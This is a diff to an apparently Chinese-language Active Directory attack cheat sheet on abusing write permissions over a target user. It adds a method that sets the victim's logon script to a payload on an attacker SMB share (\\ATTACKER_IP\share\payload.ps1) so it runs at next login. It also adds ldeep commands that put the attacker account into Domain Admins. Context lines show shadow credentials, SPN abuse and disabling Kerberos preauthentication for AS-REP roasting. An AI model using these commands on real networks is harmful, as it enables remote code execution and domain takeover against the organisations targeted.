@@ -66,7 +66,16 @@ python3 addspn.py -u 'DOMAIN\ATTACKER' -p 'Password' -t 'TARGET_USER' -s 'HTTP/f
 # 方法3: 配置 Shadow Credentials
 python3 pywhisker.py -d DOMAIN -u ATTACKER -p 'Password' --target TARGET_USER --action add --dc-ip DC_IP
 
-# 方法4: 关闭预认证实施 AS-REP Roasting
+# 方法4: 修改 Logon Script（等待用户登录时执行）
+# PowerShell (域内):
+Set-ADObject -SamAccountName TARGET_USER -PropertyName scriptpath -PropertyValue "\\ATTACKER_IP\share\payload.ps1"
+# bloodyAD:
+python3 bloodyAD.py -d DOMAIN -u ATTACKER -p 'Password' --host DC_IP \
+  set object TARGET_USER scriptPath -v '\\ATTACKER_IP\share\payload.ps1'
+# 需配合 SMB 共享 (如 impacket-smbserver) 投递 payload
+# OPSEC: 低风险但需等待用户登录触发
+
+# 方法5: 关闭预认证实施 AS-REP Roasting
 # 通过 PowerShell (域内):
 Set-ADAccountControl -Identity TARGET_USER -DoesNotRequirePreAuth $true
 # 通过 impacket:
@@ -81,6 +90,16 @@ net rpc group addmem "Domain Admins" "ATTACKER" -U "DOMAIN/ATTACKER%Password" -S
 
 # 使用 bloodyAD
 python3 bloodyAD.py -d DOMAIN -u ATTACKER -p 'Password' --host DC_IP add groupMember "Domain Admins" ATTACKER
+
+# 使用 ldeep（需要 DN）
+# 查找 DN
+ldeep ldap -u ATTACKER -p 'Password' -d DOMAIN -s ldap://DC_IP search '(sAMAccountName=ATTACKER)' distinguishedname
+ldeep ldap -u ATTACKER -p 'Password' -d DOMAIN -s ldap://DC_IP search '(sAMAccountName=Domain Admins)' distinguishedname
+# 添加到组
+ldeep ldap -u ATTACKER -p 'Password' -d DOMAIN -s ldap://DC_IP \
+  add_to_group "CN=ATTACKER,OU=Users,DC=corp,DC=local" "CN=Domain Admins,CN=Users,DC=corp,DC=local"
+# 验证
+ldeep ldap -u ATTACKER -p 'Password' -d DOMAIN -s ldap://DC_IP membersof 'Domain Admins'
 
 # 使用 PowerShell (域内)
 Add-ADGroupMember -Identity "Domain Admins" -Members ATTACKER
